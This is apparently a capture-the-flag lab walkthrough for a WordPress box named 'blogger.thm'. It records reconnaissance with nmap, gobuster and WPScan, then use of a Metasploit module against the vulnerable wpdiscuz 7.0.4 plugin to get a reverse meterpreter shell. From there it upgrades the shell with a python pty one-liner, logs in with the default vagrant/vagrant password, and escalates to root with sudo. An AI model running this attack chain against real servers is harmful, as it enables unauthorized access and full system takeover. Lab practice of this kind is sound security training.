1. Network scan the subset to find target machine IP address

 - IP FOUND: Nmap scan report for ubuntu-xenial (192.168.1.173)

2. Port Scan target machine to find open services

	PORTS FOUND:

		22 - SSH
		80 - HTTP Webserver

3. Visit webpage (Added "blogger.thm" to /etc/hosts)

4. Started gobuster on endpoint. Resulting endpoints saved in gobuster.txt

5. Wordpress instance found on /assets/fonts/blog

6. Wappalyzer shows that this application is running wordpress

7. Running WPScan against the endpoint. Resuls saved into wpscan.txt

8. From this, we found two out of date plugins
	- akismet 4.0.8
	- wpdiscuz 7.0.4 (This is vulnerable to abitrary file upload)

9. Metasploit has a exploit module for the above vulnerability

	exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload

	RHOST = http://blogger.thm/assets/fonts/blog/
	BLOGPOST = ?p=29
	LHOST = 192.168.1.168
	LPORT = 4444

10. This opens up a meterpreter shell on the remote host. (Unprivledged as www-data with /bin/sh)

11. From here we need to upgrade the shell, we can do this with a python

	python3 -c 'import pty; pty.spawn("/bin/bash")'

12. Next we are going to enumerate the users on the system:
	
	james
	ubuntu
	vagrant

13. Seeing that we have a vagrant user, we can attempt to find default credentials that come with that service. With a quick google search, we can find that vagrant/vagrant are the default credentials. We are able to switch users sucessfully with

	su vagrant
	password: vagrant 

14. From there we can view all of the sudo permissions that the vagrant has with

	sudo -l

    and we can see that we have no password accesss to all commands on the system

15. So if we run sudo escalation with

	sudo -i

    we will be elevated to the root user
